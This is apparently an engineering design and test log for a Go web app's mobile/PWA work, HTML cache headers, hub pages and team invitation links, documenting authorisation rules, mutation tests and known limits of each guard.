`TestEachAppLineIsJudgedWithItsOwnRefusal` and the binary arm of
`TestTheBinaryServesTheManifestItWasArmedWith`; the warning never printed → the binary arm; the warning
naming nothing → both. (F2) The anonymous arm of `TestAnUnarmedServerServesNoManifestAndNoPWAHead` pins
404 for the unarmed manifest against 401/303 for an unrouted path; `ui-manifest-row-requires-auth` turns
its first row into a 401.

⚠ **Two guards are INVARIANT guards, labelled:** `TestTheManifestEscapesAHostileName` (the manifest was
`encoding/json` from its first line), and the one-entry `AllowedScriptSources` assertion in
`TestTheArmedPWAHeadAddsNoScript` (it held one entry before S2).

The browser-level clauses — chromium's own installability and manifest verdicts — are
`uiaudit/pwa_test.go`'s, run by `uiaudit/pwa_check.sh`; their RED proof is its `--self-test`
(`uiaudit/README.md`, "PWA").

## What these guards still cannot see

- **Any WebKit**: whether iOS shows the name and the apple-touch icon, the standalone window, and the
  OAuth hand-back — the plan's iPhone checklist, not a test.
- **Real install engagement**: headless chromium answers installability; nothing here clicks
  "Install".
- **The deployed edge**: a CDN that rewrites or caches the manifest is outside every boot here.
- **The favicon carve-out (plan B5) is NOT deleted.** The walk's worlds boot UNARMED, so chromium
  still asks for `/favicon.ico` there and `Browser.FaviconRefusals` still counts it; the branch is
  live, not dead. Deleting it needs the walk to boot armed, which would change every capture the
  walk pushes — a separate decision.

# Phase Q — `no-store` on every HTML page (S3 of the mobile plan)

`claudedocs/plan-cairn-mobile-pwa.md`, decision 8 and R4. A header change and nothing else.

## 🔴 One writer, one value

`writeHTML` — the ONE function that writes an HTML response — sends `Cache-Control: no-store` on every
page, public rows included: the sign-in page (`renderSignIn`), the provider callback's refusals, and the
invitation landing page (`GET /join`). The value is the constant `htmlCacheControl`. Before this, every
page went out with NO `Cache-Control` and the invitation mint alone was `no-store` through its own
`writeHTMLNoStore`; that function is folded in and gone, and the mint gets the value every page does.

🔴 **This deliberately departs from the plan's decision 8 wording**, which gave the public pages
(sign-in, join) `no-cache`. The first cut of this slice built that, with a second, opt-DOWN writer; audit
round 0 removed it, and the parent accepted it. Why:
- **One writer means there is no way to put an authenticated page under the weaker value.** A second
  writer is a function somebody can call from the wrong handler, silently — and a walk only sees it if
  it drives that exact page.
- **The public pages lose nothing that matters.** `no-store` still means a deploy is seen at once
  (nothing stored, nothing stale); the only cost is that Back to the sign-in page re-fetches it instead
  of restoring it from bfcache.
- **It closes the join page's question.** That page reflects the invitation token it was opened with
  into a hidden form field; under `no-cache` the browser could have stored it.

With no service worker (O13), this header is the whole device-side storage control for an authenticated
page. ⚠ What it costs (bfcache: Chromium keeps a `no-store` page ≤ 3 minutes and evicts it on any cookie
change; Safari and Firefox re-fetch on Back) is RESEARCH, not measured here — the plan's Q7 measures it
on a phone. If Q7 says the cost is unacceptable, it is relaxed by the same one constant,
`htmlCacheControl`.

## The guard: clause (d)

`TestEveryNonPublicHTMLRowIsNoStore` (`cachecontrol_test.go`; the plan's name — it now walks the public
rows too) walks `DeclaredRouteLedger()` and requires exactly `Cache-Control: no-store` on every HTML page
it reaches. What it drives, exactly:
- **every CONTENT GET row at its REAL page**, authenticated, through the hand-written `realPage` map: the
  query that resolves against the fixture world (a real scope, entry and session — `walkSource` is
  the dispatch fixture plus one FOUND session — and, for `/arc`, the arc page's
  registrations-unconfigured state, because the fixture source has no arc journal; both arc branches
  render through the same `s.render`, so the header is the same) and a marker only that page renders. A content row missing
  from the map fails. Each marker is checked ABSENT from the navigate page the same world renders, so a
  row that silently falls back to navigate goes red rather than measuring the fallback;
- **any other non-public GET row** bare, authenticated — none exist today;
- **every public GET row** bare and anonymous; one that answers no HTML (stylesheet, script, icons,
  manifest) is not a page and is skipped.

A non-public GET row answering something other than HTML is a FAILURE, not a skip. The expected value is
a literal, never `htmlCacheControl`. Positive controls refuse a walk that read no HTML on either side or
reached fewer real pages than `realPage` declares; today it reads 8 non-public pages (all 8 real) and 3
public ones (`/sign-in`, `/join`, and the provider callback's sign-in refusal). `uiaudit/pwa_check.sh`
runs this test as clause (d); its failure messages carry the tag `pwa clause (d) no-store`, which the
script greps.

⚠ **Why the walk drives real pages (audit round 1, F1).** The first cut drove every row BARE, and a bare
`/scope`, `/entry`, `/arc` or `/session` answers the NAVIGATE page — so `ScopePage`, `EntryPage`,
`ArcPage` and `SessionPage` were never checked. The audit switched each of those four to a different
writer and `go test ./internal/ui/` stayed green; the docstring had claimed every non-public page.

The POST rows are not walked. The one POST that answers a page — the mint — is pinned by
`TestTheMintedTokenIsRenderedOnceUnderNoStoreAndNeverLogged`, whose old positive control ("an ordinary
invite page carries NO `Cache-Control`") is retired: it asserted the opposite of the new contract.

## The RED proof

Each on a scratch copy with no `.git`:

| case | result |
|---|---|
| `origin/main`, the first-cut walk | RED, 11 own-message failures (8 non-public `present=false`; 3 public) |
| the first cut (`67c8c03`) + the first-cut walk, `ScopePage` written raw (no `Cache-Control`) | **GREEN** — the F1 gap |
| head + this walk, `ScopePage` / `EntryPage` / `ArcPage` / `SessionPage` each written raw | RED, each naming its own row (`GET /scope?id=…`, `GET /entry?scope=…&ref=runbook`, `GET /arc?home=…&slug=walk-arc`, `GET /session?session=s-walk-01`) |
| head + this walk, `/scope` driven bare | RED: `answered 200 without its real page's marker` |
| the first cut's code (public `no-cache`) + this walk | RED on `/join`, `/sign-in` and the callback (D1) |
| head + this walk | GREEN, 8 real pages + 3 public |
| battery `ui-html-no-store-dropped` (`writeHTML` sends `no-cache`) | `killed` by this test, extra killer the mint test held |
| battery `ui-mint-response-loses-no-store` (the mint renders straight into the ResponseWriter) | `killed` by the mint test |
| `pwa_check.sh --self-test` sabotage (d) (`writeHTML`'s `Cache-Control` line deleted — the base's empty default) | caught by clause (d)'s own message (`uiaudit/README.md`, "PWA") |

## What these guards still cannot see

- **Any page a row renders under a query OTHER than the one walked** — refusals, the other tabs, the raw
  view, a search, the join page with a token. They reach the header through the same `writeHTML`, and that
  structural argument is what one query per row rests on; it is not a measurement of each of them. A
  handler that wrote one of them through some other path would not be seen.
- **Any real browser's cache.** The walk reads the header this process sets; whether a given browser
  (or WebKit in standalone mode) honours it, and what Back shows after sign-out, is checklist step 10.
- **An intermediary.** A proxy or CDN in front of the deployment may store or rewrite regardless.
- **Non-HTML responses.** `writePlain` refusals and `http.Redirect` bodies carry no `Cache-Control`;
  neither carries authority-narrowed content, and decision 8 is about pages.

---

# Phase R — the hub, `/scopes`, `/sessions`, the scope page's polish, and "What an agent sees"

Operator asks, implemented together on one branch in three commits (IA/routes; scope and entry polish;
the agent tab).

| route | class | what |
|---|---|---|
| `GET /` | `content` | the HUB: four cards — Arcs (`/arcs`), Scopes (`/scopes`), Sessions (`/sessions`), Team (`/team` — repointed from `/share` by #214, Phase T). `/?q=` and `/?tag=` answer **303** to `/scopes` with the query |
| `GET /scopes` | `content` | the scope list, search box and tag filter — the old root, unchanged |
| `GET /sessions` | `content` | every session the viewer can see anything of, newest first, each a link to `/session?session=…` |
| `GET /scope?id=…&tab=agent` | (the `/scope` row) | the "What an agent sees" tab |

## 🔴 The hub reads `Visible` alone, and its one count is `len(Visible)`

The scopes card's count is the scopes this viewer can read — the list `/scopes` renders. The first cut
also counted arcs (the arcs page's live rows) and sessions (the sessions page's rows); **both were
DROPPED in review (round 0, D1)**: each cost a whole-store walk on every hub load, roughly doubling it,
for a number one click away. The four cards stay. The Team card never had a count: "who has access" is
the sharing authority, and a hub consulting two authorities was a row `contentAuthority` could not express (it takes a list since #214 — `GET /team` declares three — but the hub still asks one).
The mutant row that widened the arcs read for the hub's count was RE-POINTED rather than deleted —
`StoreSource.Arcs` still feeds `/arcs` — as `ui-arcs-index-read-includes-unreadable-homes`, killed by
the arcs page's own `TestAnArcHomedInAnUnreadableScopeIsNeverListedEvenWhenItsMembersWroteWhereYouRead`.

## 🔴 `/sessions` and `/session` are one predicate

`report.SessionsAcross` and `report.SessionAcross` share ONE walk (`walkReadable`): the narrowed index,
`touch.Writes` per readable scope, and the arc rule (home readable, Q1). So "listed" and "the session
page is found" cannot disagree, and `TestTheSessionsPageListsExactlyTheSessionsWhosePageIsFound` pins the
RELATION — every listed id's page answers 200, every unlisted id's answers the uniform unseen 404 — for a
viewer of one scope and a viewer of both. A session's date and scope chips are computed over the
viewer's scopes only: `s-both-0003` sorts by its alpha bullet for A even though its beta one is newer.
No printed byte moved (structured answer only); the parity harness was re-run: `SUMMARY cases=123
passes=126 failures=0 dead-normalizations=0`.

## The redirect

`/?q=…` and `/?tag=…` (presence, not value — `/?q=` is the mobile plan's Search shortcut) answer 303 to
`/scopes?` + the PARSED query re-encoded by `url.Values.Encode`, so the `Location` never carries a
caller's raw bytes; every value survives, in sorted key order. A query naming neither parameter is the hub.

## The scope page's polish (operator decisions)

- The scope-level "N entries" and "N bullets declared open" badges are gone from the scope page; the
  scope LIST's cards keep both. The scope's own line reads "updated 5m ago", and so does every row.
- Tabs read `Entries (N)`, `Sessions (N)`, `Arcs (N)`; a count that is not a measurement is still left
  off entirely, a lower bound reads `(≥N)`.
- 🔴 **Aliases are rendered `hidden` on the entry card, and `filter.js` reveals one only when it is WHY
  the row matched** — a term that matches the alias and no other field on that row. The script still
  writes only `hidden` (and the count's text), so `TestTheFilterScriptTouchesOnlyWhatItSays` and the
  one-entry `AllowedScriptSources` are unchanged. Without script, no alias is visible.
- Tag chips: squarer, tighter pill, `#` drawn by CSS (`::before`), so link text, `data-filter` and every
  test reading `<a …>tag</a>` are unchanged. Breadcrumbs: `text-xs`, pulled up toward the header, and the
  card after them drops its top margin; still wrap, and still 44px under a coarse pointer (S1's block).
  ⚠ The breadcrumb rule is shared, so this applies on EVERY page with a trail (scope, entry, arc,
  arcs, session, sessions), not only the entry page the ask named — deliberate: one trail, one look.

## 🔴 "What an agent sees" is the CLI's bytes, and says where an agent's own run differs

`StoreSource.Recall` builds `report.RecallOptions` exactly as `cairn recall --scope <scope>` does (no
`--list`/`--limit`/`--page`: digest mode, the default entry limit, page 1; a scope named, so no focus
window), runs `report.Recall` over the viewer's narrowed set and prints `RenderText(host, nil, "")` —
the renderer the CLI and the pod run, never a re-render. `TestTheAgentTabIsByteForByteTheCLIRecall`
builds the expectation from the CLIENT package's own option builder (`client.RecallSelectionFor`) and
compares the unescaped `<pre>` text byte for byte.

It is authorised twice: the scope page refuses an unreadable scope before any tab is chosen (the one
`browseRefusal`), and the recall read is itself narrowed, so a scope NAME that reached it any other way
answers the renderer's scope-absent text (`TestTheRecallReadIsNarrowedByTheViewersAuthority`).

The tab carries ONE note naming the FOUR places an agent's own run differs — same renderer, different
place it ran (from the usage trace in PR #211, `claudedocs/plan-cairn-agent-view.md`): the resume/handoff
skills run `cairn recall --repo`, which features
the entry the repo's newest handoff doc names (`--scope` cannot, and the server has no repo — not
reproduced here); the client prints a state banner above the text; and the `store:`/`host:` lines name
whoever rendered it (`store:` is the renderer's StoreRoot: this server's here, the agent's per-host cache path there) — two of the four. ⚠ So the tab DOES print this server's
store root, which every other page here deliberately omits; it is the same line `GET
/api/v1/recall/<scope>` already prints to every reader of the scope, and byte equality requires it.

**The `head -60` mark.** Agents almost always truncate — the usage trace in PR #211
(`claudedocs/plan-cairn-agent-view.md`) found most standalone recalls piped through `head`/`grep`/`sed`,
most often `head -60` — so the text is split into two `<pre>`s where that cut falls, with the lines and
bytes above and below. The client prints a preamble first, and the number of lines it takes is COUNTED
from `client.RecallPreamble` — the one string `recall` now prints there (banner, blank line; the bytes
of the two `Fprintln`s it replaced) — so a banner that grows a line moves the mark. Today that is two,
so the cut falls after line **58** of the recall text. The two
halves concatenate to the exact bytes. Size is the UTF-8 byte count; tokens are bytes ÷ 4, labelled an
estimate.

## Cost, measured

`BenchmarkSessionPageAndScopeTabs -benchtime 20x`, one host, NOT idle (the absolute numbers are higher
than Phase I's for the same rows), ms per request:

| size | hub | sessions list | scopes list | session page | entry page |
|---|---|---|---|---|---|
| 10 scopes × 30 entries | 32.7 | 25.0 | 12.6 | 22.9 | 18.0 |
| 30 scopes × 100 entries | 299 | 201 | 134 | 303 | 142 |

The `hub` column is the FIRST cut, with its arcs and sessions counts: it cost about what the session
page costs (≈2.2× the scope list at 3,000 entries). That measurement is why both counts were dropped
(D1); the hub now reads `Visible` alone — the scope list's read — and was not re-measured.


# Phase S — `pwa.js`, the shortcuts and the install screenshots (S4 of the mobile plan)

`claudedocs/plan-cairn-mobile-pwa.md`, decisions 5, 10, 11 and 16, O3/O7/O8/O13. `pwa.go` holds all of
it; `pwa.js` is the script. ⚠ Phase P's "NO script" and its `TestTheArmedPWAHeadAddsNoScript` row are
S2's record: S4 replaced that test with `TestTheArmedPWAHeadAddsOnlyThePWAScript` and re-pointed its
battery row (`ui-pwa-head-emits-an-unversioned-script`).

## 🔴 One more script, admitted by the allowlist and nothing else

`AllowedScriptSources()` is now exactly `[filter.js, pwa.js]`, both content-hashed `classPublic` rows.
`pwaHead` emits `pwa.js` (`defer`) on every frame of an ARMED deployment — sign-in included, because an
install starts there — and nothing on an unarmed one. The script:
- reveals the header's `<button class="install" hidden>` (shell frame only) on `beforeinstallprompt`,
  and replays that event's `prompt()` on a click;
- reveals the ROOT page's iOS hint only where `"standalone" in navigator && navigator.standalone ===
  false` — feature detection, never the user agent — unless this browser dismissed it;
- does nothing at all under `display-mode: standalone`;
- writes ONE thing, ever: `localStorage["cairn.installHintDismissed"] = "1"`, on a dismiss tap, inside a
  `try` (blocked storage simply means the hint shows again). Sign-out does not clear it (decision 11).
- registers NO service worker (O13).

Two guards hold that, at two depths: `TestThePWAScriptTouchesOnlyWhatItSays` — a SPELLING guard, labelled
as one (`window["local"+"Storage"]` walks it) — refuses the markup/code/network/storage sinks, `caches`,
`serviceWorker`, and (until S5) `location`/`history`, and admits `localStorage` ONLY as the one `getItem`
and the one `setItem(HINT_KEY, "1")`; and the STATE guard is the browser, `uiaudit`'s
`TestPWAClauses/e_storage` (clause (e)).

## Shortcuts — two departures from the plan's literal list, both forced by `main`

- **Search → `/scopes?q=`**, not `/?q=`: the UI hub moved the search box to `/scopes` (`/?q=` still
  answers, with a 303 there; a launcher need not take the hop).
- **"Team" → `/team`**: S4 shipped it as `/share`, because `/team` was not on `main` at its branch
  point. Merging it with the Team page (Phase T) made `/share` a bodiless 303 to `/team` and dropped
  its `content` class, so this section's test refused it on both counts (not a `GET … content` row,
  and 303 rather than 200 signed in); the merge repointed it, beside the hub's Team card.

`TestEveryShortcutIsADeclaredRowThatReturnsThroughSignIn` pins, as LITERALS never derived from
`signInLocation`, the 303 each answers a stranger's browser: `/sign-in?next=%2Farcs`,
`/sign-in?next=%2Fscopes%3Fq%3D`, `/sign-in?next=%2Fteam` — and 200 signed in.

## 🔴 Install screenshots: build output, provenance enforced

`screenshots/screenshots.json` is the ONE list (three readers: this package, `uiaudit -screenshots`, the
flake's `onlyGo`). `narrow-hub`/`narrow-arcs` are 390×844 TOUCH captures of `/` and `/arcs`; `wide-hub`
is 1440×900 of `/`. The PNGs are what `flake.nix`'s `uiScreenshots` captures from the synthetic uiaudit
world in the sandbox; `checks.ui-screenshots-are-current` re-captures and byte-compares, with a
one-byte-appended negative control and a PROVENANCE control (one fixture scope renamed — the capture must
move; it moves `narrow-arcs`). `tests/leakscan.py` skips PNGs; that comparison is their leak gate. What
the capture holds still, and the measurements behind each choice (an UNARMED world, hidden scrollbars, a
fonts.conf of our own), is in `uiaudit/README.md`.

## The RED proof

Battery rows (`tests/control_mutants.py`, each `killed` by the named test, full run
`mutants=309 killed=307 survived=2`, the two EQUIVALENT rows):

| mutant | killed by |
|---|---|
| `pwa.js` dropped from `AllowedScriptSources` | `TestTheArmedPWAHeadAddsOnlyThePWAScript` |
| `pwa.js` sets an `innerHTML` label | `TestThePWAScriptTouchesOnlyWhatItSays` |
| `pwa.js` writes a second key (a timestamp) | `TestThePWAScriptTouchesOnlyWhatItSays` |
| `pwa.js` registers a service worker | `TestThePWAScriptTouchesOnlyWhatItSays` |
| a screenshot row serves its bytes plus one | `TestTheScreenshotSetIsExactlyTheCommittedFiles` |
| `pwaHead` links the unversioned `/static/pwa.js` | `TestTheArmedPWAHeadAddsOnlyThePWAScript` |

Outside the battery, on a scratch copy with no `.git`, each with its own message: Search pointed back at
the plan's `/?q=` → `TestEveryShortcutIsADeclaredRowThatReturnsThroughSignIn`; the iOS hint put in the
shell (every page) and the Install button rendered without `hidden` →
`TestTheInstallControlsAreHiddenAndArmedOnly`; a stray `narrow-extra.png`, and `wide-hub.png` copied over
`narrow-hub.png` → `TestTheScreenshotSetIsExactlyTheCommittedFiles`; the script row made `classContent`
→ `TestThePWAScriptIsServedAtItsContentHashedRoute` (an anonymous 401); a `location.reload()` in
`pwa.js` → `TestThePWAScriptTouchesOnlyWhatItSays`. The nix check went RED on one byte appended to the
committed `wide-hub.png` (`FAIL: these committed screenshots are not what the synthetic world renders:
wide-hub.png`), and its provenance control exited 2 when the "renamed" capture was pointed at the
unrenamed one. The browser-level clauses' RED proof is `pwa_check.sh --self-test` (`uiaudit/README.md`).

⚠ **At the base these tests do not compile** (they name `pwaScript`, `ScreenshotSpecs`, …), which is
"red" only in the weakest sense; the mutants above are the per-guard proof.

## What these guards still cannot see

- **Any WebKit**: the iOS hint's feature detection, its storage lifetime, Add to Home Screen — the
  iPhone checklist (steps 3–4), not a test.
- **A real `beforeinstallprompt` under real engagement**, and the browser's own install dialog: the
  button is driven by a SYNTHETIC event. Headless chromium 152 does fire a trusted one on its own; the
  browser test intercepts it so "hidden by default" is not a race.
- **Cross-host screenshot bytes**: byte-identical sandboxed and unsandboxed on one host; the `nix` CI
  job is the second host.
- **An obfuscated sink** in `pwa.js` (`window["inner"+"HTML"]`): the spelling guard's labelled limit.

# Phase T — the Team page and the multi-target TEAM LINK

`GET /team` is THE page for "who can get at my notes" (operator decision **O-a**: "one page" means
the FORMS live there). Its sections:

- **Share** — `?scope=<id>` picks a scope: who has access (with HOW each principal reaches it), what
  can be taken back, and the grant form. With no `?scope=`, the scopes this caller can share.
- **Invite** — `?project=<id>` picks a project: its outstanding single-project invitations with
  revoke, the mint form, and its **project-wide grants** with revoke (O-b). With no `?project=`, the
  projects this caller can invite into.
- **Team links** — the multi-target link form (projects and/or scopes, a role, a lifetime, an
  "allow reuse" box), and every link this caller minted with targets, role, expiry, reuse, redemption
  count, the per-redemption log and revoke while open.

Three notices sit above every shape: the replica-honesty notice, `InviteHonesty` and `TeamHonesty`,
each pinned as a whole normalised string against a literal. Rows: `GET /team` (`content`, answered
from THREE authorities — `contentAuthority` requires `sharing`, `inviting` AND `team`),
`POST /team/link` and `POST /team/link/revoke` (no class — both cross-site gates by METHOD).

## 🔴 `/share` and `/invite` answer 303 to `/team`; their POST rows are unchanged

`GET /share` → `/team?<same query>#share`, `GET /invite` → `/team?<same query>#invite`, bodiless
(`redirectToTeam`, not `http.Redirect`, whose `text/html` body is an HTML response no `no-store`
writer produced — `TestEveryNonPublicHTMLRowIsNoStore` declares both rows as redirects). A pre-move
`/invite?outcome=revoked` is translated to `invite-revoked`: on one page the bare `revoked` code is
the share flow's banner. Both GET rows lost the `content` class — a redirect renders no answer about
authority. `POST /share`, `POST /unshare`, `POST /invite` and `POST /invite/revoke` are the same rows
behind the same gates answering the same refusals; only where they LAND moved (`/team?…#share`,
`#invite`), and a mint renders its one-time link ON the Team page. The two old page handlers became
the page's section builders (`shareSection`, `inviteSection`) — same reads, same uniform 404s
(`scopeRefusal`, `inviteRefusal`) — and every test over them was RE-AIMED at `/team`, none deleted.
The header carries ONE entry, "Team" (round 0 D3); "Sharing" and "Invitations" are gone and the
nav-affordance ledger now refuses either coming back.

## 🔴 The model: a SIBLING of the invitation, never a wider one

`internal/invite/teamlink.go` (`TeamLink`, `LinkStore`) and migration **2** (`team_links`,
`team_link_targets`, `team_link_redemptions`). Version 1 is untouched (append-only), and
`TestMigrationTwoUpgradesAVersionOneDatabase` builds a version-1 database holding an open invitation
and migrates it: the invitation survives, the ledger reads `[1 2]`, a link redeems. (Migration 2 was
edited in place once, in this PR's fix round, to add `team_link_redemptions.confirmed`; it had never
been applied outside a test.) Shared with the invitation, on purpose: `invite.NewToken`,
`invite.Digest`, 256-bit tokens, digest-only storage, the token shown ONCE, and the ONE join path: a
link is `/join?invite=<token>`, and `ControlInviting` hands any token its own store does not know to
`ControlTeamLinks` (`ControlInviting.Links`). Dispatch is by STORE, never by a prefix or form field.

**There is no separate team-link wiring** (round 0 D2): the server reads the link half from
`Inviting.TeamLinks()`, and `ui.New` refuses an invitation half that carries none
(`ErrInvitingWithoutTeamLinks`) — so a half-wired server cannot be built. `cmd/cairn-ui` builds both
halves from one `$DB` in one function, `wireInvitations`, which `TestTheWiredInvitationHalfRedeemsATeamLink`
(ordinary tier) and `TestTheWiredHalvesMintAndRedeemALinkAgainstPostgres` (Postgres tier) drive by
minting through the Team page's half and redeeming through the invitation half. Round 1 🟡4
measured the gap this closes: deleting `Links: links` from `main` left both tiers green.

**Lookup is by digest, so the "constant-time compare" is the same as the invitation's: there is no
token comparison at all** — the presented token is hashed and the database is asked for that digest.

## 🔴 `reader` is a read-only GRANT, not a `control.Role` — and it is listed and revocable

`control.Role` is owner/admin/member — all three write. A `reader` role would put a new role string
into `member-set` records on the append-only journal, which an image ROLLBACK cannot replay
(`Event.validate` refuses an unknown role). So (operator decision **O-b**, keeping this) the link
roles are `reader | member | admin` (no `owner`: a reusable owner link is a transfer of the project
to whoever reads a chat log), expressed through record kinds every deployed build already accepts:

| target | `reader` | `member` | `admin` |
|---|---|---|---|
| project | `granted` {read} over the PROJECT | `member-set` member | `member-set` admin |
| scope | `granted` {read} | `granted` {read,write} | `granted` {read,write,admin} |

`linkVerbs` is the one table; `TestLinkVerbsMatchTheControlRoleTable` pins `member`/`admin` against
what membership at that role confers through `Resolve`.

🔴 **A project-wide grant is SEEN and TAKEN BACK on a page, never only with the CLI** (O-b, and round
1 🟡3, which measured the share page's note — "keeps it after every grant below is revoked" — FALSE
for a project-wide grantee). Now: the scope's audience labels such a principal "via a project-wide
grant" (`Viewer.ByProjectGrant`); the scope's take-back list includes project-wide grants on the
owning project, each labelled "project-wide: every scope in <project> — revoking it withdraws all of
them" before its button (`GrantRow.ProjectWide`); and the Team page's project section lists every
project-wide grant with revoke (`Sharing.ProjectGrants`, reached only for a project `Invitable`
returned). 🔴 **The Revoke button and the project's NAME are decided PER VIEWER** (round 2 🟡A):
the take-back rows are viewer-independent, and gating the button on a session token alone offered an
outsider scope admin Revoke on a project-wide row that the write then refused (403). `Sharing.ForViewer`
marks each row with `mayRevokeGrant` — the SAME predicate `POST /unshare` runs — and the row renders
"only a project owner or admin can revoke this" instead of a form when it says no; it also blanks
the project's name for a viewer who is not in that project ("a project-wide grant — revoking it
withdraws every scope in its project"). A project-wide revoke from the project section lands back
on `/team?project=…#invite`. `POST /unshare` decides by the grant's OBJECT (`mayRevokeGrant`): a scope grant needs
`admin` on that scope, as before; a project-wide grant needs `CanManageMembers` on the actor's own
membership — never scope admin, so an outsider with admin on one scope cannot withdraw a grant over
the whole project — and is refused outright for a NARROWED credential (membership authority is not
in a narrowing; `membershipActor`'s rule, applied from `auth.Narrowed()` because the handler passes
the attribution principal).

## 🔴 One authority predicate, three readers — and the third is the redemption

`mayLink(model, minter, target, role)` is asked by `Mintable` (the chooser), by `Mint`, and by
EVERY redemption, of the MINTER, against the model as it is at redemption (`reCheckMinter`). A
minter demoted, removed or deleted after minting mints nothing usable — the link refuses whole, is not
spent and logs nothing. Its two arms read the two authority axes and neither reads `Model.Grants`:

- **project** — membership authority: `CanManageMembers` on the minter's own membership, and
  `CanConfer` for member/admin (the invite flow's `mayManage` + `Mint` rules, unchanged);
- **scope** — `control.Resolve` of the minter: `admin` on the scope (the share flow's rule) AND every
  verb the role confers. Verbs are independent bits, so an admin-only grantee cannot hand out `read`.

A link is minted whole or not at all: one target out of reach refuses it (`ErrNotLinkable`, ONE
error for "no such target" and "not yours", so the mint is not an existence oracle). A narrowed
credential reaches none of this — every call goes through `membershipActor`, and
`TestEveryMembershipDecisionActsAsMembershipActor` watches `TeamLinking`/`ControlTeamLinks` too.
A redemption never OVERWRITES a membership (the owner-demotion hazard `ErrAlreadyAMember` exists for):
a held target is skipped, and a redeemer who already holds every target gets `ErrAlreadyAMember` with
nothing spent. The journal's actor on every record is the MINTER.

**Ownership of a link is the minter alone** — listed only to them, revocable only by them. A
co-admin cannot withdraw a colleague's leaked link from this page; what bounds that is the re-check
(demote the minter and every link they made dies).

## 🔴 The redemption log: written at the spend, a JOIN only once CONFIRMED

Round 1 🟡1 measured the log naming joins that never happened: two tabs, one GitHub identity, one
reusable link — both callbacks spend the link, the second journal write is refused (a duplicate
provider/subject), and the page showed "#2 usr_… joined (account created by this link)" for an
account that does not exist. The row is still WRITTEN at the spend — written after, a crash between
the journal write and the log write would lose the audit of a REAL join, and for a reusable link the
log is the only place an operator sees who it let in — but it is `confirmed = false` until the
authority write succeeds (`ControlTeamLinks.confirmed`), and the page renders an unconfirmed row as
"an attempt … NOT confirmed: the join may not have been recorded" — "may", because a confirmation
that itself fails leaves the join recorded and the row unconfirmed (the conservative reading); that
case says so on the operator's log line and does not refuse the sign-in. The link's own row counts
SPENDS as "N redemption attempt(s), M confirmed", never as joins. `TestTheRedemptionLogNamesOnlyRealJoins` reproduces the
double-callback deterministically (a store barrier holds both spends until both tabs have passed the
"unknown subject" check).

The operator's log line for a link redemption names the link — `link=<digest prefix> role=<role>
targets=<n>` — rather than the blank `project= role=` it printed (round 1 🟢5,
`TestALinkRedemptionLogLineNamesTheLink`); it never carries the token.

## 🔴 Reuse is UNLIMITED until expiry or revoke — the residual, stated

The operator chose unlimited reuse over a capped count. **A leaked reusable link is OPEN ENROLMENT
until it expires or is revoked**: anybody holding it can create a principal and join every target, as
many times as they like, at whatever rate the OAuth flow admits (the flight table's per-client and
global caps are the only rate bound; there is no per-link rate limit). What bounds it: the TTL ceiling
`invite.MaxLinkTTL` (**30 days**, default still 7, chosen per link in whole days), revoke, the
minter re-check, and the per-redemption log. Unticked reuse is single use, as an invitation is.

🔴 **The token travels in a URL query, so it lands in ACCESS LOGS** (round 1 🟢6). `GET
/join?invite=<token>` is what a link opens, and nginx's default `log_format` records `$request`,
query included — so every gateway between the reader and this pod writes a reusable, up-to-30-day
enrolment capability to disk in plain text. **Deploy note: strip the query string from access logs
for `/join`** (in the deployment repository, outside this PR — e.g. log `$uri` rather than `$request`
for that location). In-app mitigation, PROPOSED and not built: mint the link with the token in the URL
FRAGMENT (`/join#invite=…`), which a browser never sends to any server and so no access log can hold.
It is not cheap here: the join page would need a script to move the fragment into the accept form,
and this surface's script allowlist (`AllowedScriptSources`, two entries since S4 added `pwa.js` —
Phase S) is a deliberate gate — a third script is a decision, not a tidy-up.

## 🔴 Rolling back across migration 2

A build that predates the team link knows only schema version 1 and REFUSES TO START against a
database at version 2 ("migrated by a NEWER build") — on `cairn-ui`, that takes sign-in down (round 1
🟡2). The recipe, run against the database BEFORE the older image starts:

```sql
DELETE FROM schema_migrations WHERE version = 2;
```

The older build then starts; it never reads the three `team_*` tables, so they stay, rows and all.
Links minted before the rollback are not redeemable while it runs (it does not know they exist).
Re-upgrading is safe: every version-2 statement is `IF NOT EXISTS`, so the newer build re-applies and
re-records version 2 over the surviving tables. `TestTheRollbackRecipeLetsAnOlderBuildStartAndReUpgrades`
measures the three steps through the same startup predicate every build runs (`refuseFromTheFuture`):
the refusal exists, the recipe lifts it, and re-upgrading is clean with a pre-rollback link intact.

## 🔴 The SQL guard is a second spelling of `TeamLink.StateAt`, pinned

`RedeemLink` is one conditional `UPDATE … RETURNING` (`revoked_at IS NULL AND expires_at > $at AND
(reusable OR redemptions = 0)`) plus the (unconfirmed) log row, in one transaction. The
`team_links_single_use` CHECK refuses a second redemption of a single-use row even from an unguarded
statement. `TestTheTeamLinkRedemptionGuardAgreesWithStateAt` drives the CLOSED boundary (µs before /
at / after the STORED expiry, with a non-µs-aligned remainder) and the revoked and spent arms; 8
concurrent redemptions give exactly 1 winner single-use and 8 distinct sequence numbers reusable.

## The journal / token-file deployment

No database → no invitation half, and so no link half (one is read from the other). `GET /team`
still answers 200: the share section (which needs no database) is populated from the authority — on
a token-file deployment it says the authority is read-only, as the share page did — and the invite
section and the team-link section each say `NoInviteStore`; every invite and link write answers 501
with it. `uiaudit`'s journal world walks `GET /team` (and, through its expansion, `/team?scope=…`
with the grant form) and REFUSES unless a Team capture carries `NoInviteStore` on BOTH sections.

## Not in this PR (operator decision O-c)

Folding single-project invitations into team links is a separate, later change. Until then the Team
page carries both: the single-project invitation (one project, one role, single use, may confer
`owner`) and the team link.

## The RED proof

Pre-change code has none of the first round's symbols, so "red on base" is a compile failure and
proves nothing about any guard. Each guard's RED is therefore its MUTANT — the narrowest edit that
removes the rule — killed by the test that names it (`tests/control_mutants.py`, each run alone with
`--only`, positive control GREEN each time), plus the SQL half on scratch copies through
`tests/pgtest/run.sh`:

| rule broken | mutant | killed by |
|---|---|---|
| link grants a verb its minter lacks | `ui-teamlink-scope-arm-stops-asking-for-every-verb` | `TestALinkCannotConferVerbsItsMinterLacks` |
| scope link without admin | `ui-teamlink-scope-arm-drops-the-admin-requirement` | `TestAScopeLinkNeedsAdminOnTheScope` |
| project link by a plain member | `ui-teamlink-project-arm-stops-asking-who-may-manage` | `TestAProjectLinkNeedsAMemberManager` |
| mint trusts the chooser | `ui-teamlink-mint-skips-the-authority-check` | `TestAProjectLinkNeedsAMemberManager` (+2) |
| redeem skips the re-check | `ui-teamlink-redeem-skips-the-minter-recheck` | `TestAMinterWhoLostAuthorityMintsNothingUsable` |
| reuse unticked, redeemable twice | `invite-teamlink-single-use-stops-closing` | `TestASingleUseLinkRedeemsExactlyOnce` |
